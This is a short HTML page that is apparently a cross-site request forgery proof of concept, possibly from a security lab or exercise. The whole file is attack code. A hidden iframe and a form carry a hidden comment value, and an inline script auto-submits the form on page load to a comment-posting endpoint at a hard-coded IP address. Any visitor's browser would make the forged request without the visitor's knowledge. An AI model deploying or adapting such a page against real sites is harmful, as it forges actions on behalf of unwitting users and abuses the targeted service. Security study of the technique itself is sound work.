
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>


<iframe style="display:none" name="csrf-frame"></iframe>
<form method='POST' action='http://188.226.142.118/create-comment.php' target="csrf-frame" id="csrf-form">
  <input type='hidden' name='comment' value='I am Mads'>
  <input type='submit' value='submit'>
</form>
<script>document.getElementById("csrf-form").submit()</script>

</body>
</html>